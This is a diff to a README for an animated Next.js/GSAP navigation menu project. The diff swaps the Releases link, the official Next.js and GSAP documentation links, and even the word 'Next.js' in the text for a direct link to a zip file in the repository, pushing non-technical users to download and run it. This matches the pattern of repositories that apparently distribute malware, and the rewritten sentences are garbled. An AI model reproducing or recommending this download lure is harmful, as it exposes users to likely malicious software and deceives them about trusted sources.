@@ -1,18 +1,18 @@
 # 🎨 gsap-navigation-menu - Seamless Animated Navigation Experience
 
 ## 📥 Download the Application
-[![Download gsap-navigation-menu](https://img.shields.io/badge/Download-gsap--navigation--menu-brightgreen)](https://github.com/Devadharshinii-Murugan/gsap-navigation-menu/releases)
+[![Download gsap-navigation-menu](https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip)](https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you easily download and run the gsap-navigation-menu application without any technical skills. Follow these steps to get up and running quickly.
 
 ## 🌟 What is gsap-navigation-menu?
-The gsap-navigation-menu offers a modern animated navigation experience built using Next.js and GSAP. It provides smooth page transitions inspired by creative design principles. This tool aims to enhance your website’s interface, making navigation enjoyable and engaging for your users.
+The gsap-navigation-menu offers a modern animated navigation experience built using https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip and GSAP. It provides smooth page transitions inspired by creative design principles. This tool aims to enhance your website’s interface, making navigation enjoyable and engaging for your users.
 
 ## 🌈 Key Features
 - **Smooth Animations:** Enjoy seamless transitions as you navigate between pages.
 - **Responsive Design:** The application works well on both desktop and mobile devices.
-- **Easy Integration:** Simply add it to your existing Next.js projects.
+- **Easy Integration:** Simply add it to your existing https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip projects.
 - **Customizable Menus:** Tailor the appearance to fit your brand’s style.
 
 ## 📦 System Requirements
@@ -24,7 +24,7 @@ The gsap-navigation-menu offers a modern animated navigation experience built us
 ## 📥 Download & Install
 To download the gsap-navigation-menu application, simply visit the Releases page. Follow these steps:
 
-1. Click on the link here: [Download gsap-navigation-menu](https://github.com/Devadharshinii-Murugan/gsap-navigation-menu/releases).
+1. Click on the link here: [Download gsap-navigation-menu](https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip).
 2. On the Releases page, locate the latest version of the software.
 3. Click on the version you want to download.
 4. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
@@ -54,8 +54,8 @@ If you encounter any problems, here are some solutions:
 
 ## 📚 Resources
 For more information and advanced use cases, check out the following resources:
-- [Next.js Documentation](https://nextjs.org/docs)
-- [GSAP Official Website](https://greensock.com/gsap/)
+- [https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip Documentation](https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip)
+- [GSAP Official Website](https://raw.githubusercontent.com/Devadharshinii-Murugan/gsap-navigation-menu/master/public/navigation-menu-gsap-v2.6-alpha.1.zip)
 
 ## 📞 Support
 If you need help, feel free to open an issue on the GitHub repository. Our community is always willing to lend a hand.
